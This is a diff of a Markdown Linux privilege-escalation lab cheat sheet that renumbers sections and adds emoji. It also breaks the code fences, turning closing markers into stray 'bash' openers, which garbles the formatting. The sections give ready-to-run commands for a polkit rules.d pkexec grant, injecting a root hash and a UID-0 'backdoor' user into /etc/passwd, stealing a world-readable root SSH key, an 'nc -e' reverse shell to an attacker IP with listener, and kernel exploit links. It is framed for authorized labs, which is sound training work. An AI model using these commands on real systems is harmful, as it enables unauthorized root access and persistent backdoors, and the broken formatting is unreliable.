+### 🛡️ 12 · Polkit rules.d
 
 <details>
-<summary>Writable polkit rules directory allows blanket pkexec grant</summary>
+<summary>🛡️ Blanket pkexec grant via rules.d</summary>
 <br>
 
 **Identify misconfiguration:**
 ```bash
 find /etc/polkit-1/rules.d/ -writable -type d 2>/dev/null
-```
-
+```bash
 **Create malicious rule:**
 ```bash
 cat > /etc/polkit-1/rules.d/99-pwn.rules << 'EOF'
@@ -1115,26 +1084,23 @@ EOF
 
 chmod 644 /etc/polkit-1/rules.d/99-pwn.rules
 cat /etc/polkit-1/rules.d/99-pwn.rules
-```
-
+```bash
 **Trigger escalation:**
 ```bash
 pkexec /bin/bash -p
-```
-
-🧹 **Cleanup:**
+```bash
+> 🧹 **CLEANUP — remove all traces after the lab:**
 ```bash
 rm /etc/polkit-1/rules.d/99-pwn.rules
-```
-
+```bash
 </details>
 
 ---
 
-### 25 · Writable /etc/passwd
+### 📝 13 · Writable /etc/passwd
 
 <details>
-<summary>Inject a password hash directly into /etc/passwd</summary>
+<summary>📝 Inject hash into /etc/passwd</summary>
 <br>
 
 ```bash
@@ -1156,30 +1122,27 @@ head -1 /etc/passwd
 
 # 5. Become root
 su root    # enter: mani
-```
-
+```bash
 **Alternative — Add new root user (safer):**
 ```bash
 hash=$(openssl passwd -6 "mani")
 echo "backdoor:${hash}:0:0:root:/root:/bin/bash" >> /etc/passwd
 su backdoor    # enter: mani → root
-```
-
-🧹 **Cleanup:**
+```bash
+> 🧹 **CLEANUP — remove all traces after the lab:**
 ```bash
 sudo cp /etc/passwd.bak /etc/passwd
 sudo chmod 644 /etc/passwd
 sudo rm /etc/passwd.bak
-```
-
+```bash
 </details>
 
 ---
 
-### 26 · Readable Root SSH Key
+### 🔏 14 · Readable Root SSH Key
 
 <details>
-<summary>Steal a world-readable root private key and SSH in as root</summary>
+<summary>🔏 Steal readable root SSH key</summary>
 <br>
 
 **Setup:**
@@ -1190,8 +1153,7 @@ sudo systemctl start ssh && sudo systemctl enable ssh
 sudo sed -i 's/^#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
 echo "PermitRootLogin yes" | sudo tee -a /etc/ssh/sshd_config > /dev/null
 sudo systemctl restart ssh
-```
-
+```bash
 **Create key pair and simulate misconfiguration (as root):**
 ```bash
 ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
@@ -1205,31 +1167,28 @@ ls -l /root/.ssh/id_rsa    # -rw-r--r--
 cp /root/.ssh/id_rsa /home/kali/stolen_key
 chown kali:kali /home/kali/stolen_key && chmod 600 /home/kali/stolen_key
 exit
-```
-
+```bash
 **Exploit (as kali):**
 ```bash
 ssh -i /home/kali/stolen_key root@localhost
 # you got root
-```
-
-🧹 **Cleanup:**
+```bash
+> 🧹 **CLEANUP — remove all traces after the lab:**
 ```bash
 rm /root/.ssh/id_rsa /root/.ssh/id_rsa.pub
 rm /home/kali/stolen_key
 > /root/.ssh/authorized_keys
 sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
 systemctl restart ssh
-```
-
+```bash
 </details>
 
 ---
 
-### 27 · Reverse Shell via nc
+### 🐚 15 · Reverse Shell via nc
 
 <details>
-<summary>Direct root shell using sudo/SUID netcat with -e flag</summary>
+<summary>🐚 Direct root shell via nc -e</summary>
 <br>
 
 ```bash
@@ -1238,22 +1197,20 @@ sudo nc -e /bin/sh 192.168.66.5 4444
 
 # Attacker listener
 nc -lvnp 4444
-```
-
+```bash
 </details>
 
 ---
 
-### 28 · Kernel Exploits
+### 🧨 16 · Kernel Exploits
 
 <details>
-<summary>Match kernel version to known local privilege escalation CVEs</summary>
+<summary>🧨 Match kernel → known CVEs</summary>
 <br>
 
 ```bash
 uname -a    # Get kernel version → search on exploit-db
-```
-
+```bash
 - 🔗 [Linux Kernel - Local Privilege Escalation (52591)](https://www.exploit-db.com/exploits/52591)
 - 🔗 [Linux Kernel - Local Privilege Escalation (52585)](https://www.exploit-db.com/exploits/52585)
 
@@ -1261,37 +1218,34 @@ uname -a    # Get kernel version → search on exploit-db
 
 ---
 
-### 29 · Internals Reference
+### 📚 17 · Internals Reference
 
 <details>
-<summary>Concepts, D-Bus, cache indexing, systemd, tools</summary>
+<summary>📚 Concepts · D-Bus · systemd · tools</summary>
 <br>
 
 **Cache Indexing Methods:**
-```
+```bash
 VIVT — Virtually  Indexed, Virtually  Tagged
 PIPT — Physically Indexed, Physically Tagged
 PIVT — Physically Indexed, Virtually  Tagged
 VIPT — Virtually  Indexed, Physically Tagged
-```
-
+```bash
 **Key Concepts:**
-```
+```bash
 Seccomp, KSM, MMU, I/O buses, CPU execution ports
 CPU mesh, Linux Kernel Crypto Subsystem
 Cross-core attack, cross-CPU attack
 File I/O: Buffered | Page cache | Standard lib | Synchronized
 SELinux vs AppArmor
-```
-
+```bash
 **Systemd / Session:**
 ```bash
 sudo visudo
 nano /etc/sudoers
 systemd-cgls --unit user.slice
 pstree -slap
-```
-
+```bash
 **D-Bus IPC — Enumeration:**
 ```bash
 systemctl status dbus
@@ -1313,15 +1267,13 @@ busctl introspect org.freedesktop.NetworkManager /org/freedesktop/NetworkManager
 busctl monitor
 dbus-monitor --system
 dbus-monitor --system "destination='org.freedesktop.systemd1'"
-```
-
+```bash
 **D-Bus Layers:**
-```
+```bash
 Layer 1 — D-Bus Protocol
 Layer 2 — libdbus
 Layer 3 — D-Bus daemon (dbus-daemon / dbus-broker)
-```
-
+```bash
 **Tools:**
 ```bash
 git clone https://github.com/Aegrah/PANIX.git
@@ -1330,8 +1282,7 @@ git clone https://github.com/peass-ng/PEASS-ng.git
 
 pip install gtfobins-cli --break-system-packages
 gtfo python
-```
-
+```bash
 </details>
 
 ---
@@ -1340,11 +1291,13 @@ gtfo python
 
 <div align="center">
 
-![Enum](https://img.shields.io/badge/🔍_Enumeration-8_techniques-0075ca?style=flat-square)
-![Persist](https://img.shields.io/badge/🔒_Persistence-4_techniques-e69500?style=flat-square)
-![PrivEsc](https://img.shields.io/badge/⚡_Privilege_Escalation-17_techniques-d73a4a?style=flat-square)
+<img src="https://capsule-render.vercel.app/api?type=waving&color=0:FFD700,50:FF4500,100:8B0000&height=120&section=footer&animation=fadeIn" width="100%"/>
 
-**Curated by [m.manikandan](https://github.com)**
-*For educational use in authorized lab environments only. Always run cleanup steps after each lab.*
+![Enum](https://img.shields.io/badge/🔍_Enumeration-8_techniques-0075ca?style=for-the-badge)
+![Persist](https://img.shields.io/badge/🔒_Persistence-4_techniques-e69500?style=for-the-badge)
+![PrivEsc](https://img.shields.io/badge/⚡_Privilege_Escalation-17_techniques-d73a4a?style=for-the-badge)
+
+**Curated by [m.manikandan](https://github.com)**<br>
+*For educational use in authorized lab environments only. Always run cleanup steps after each lab.* ⭐
 
 </div>
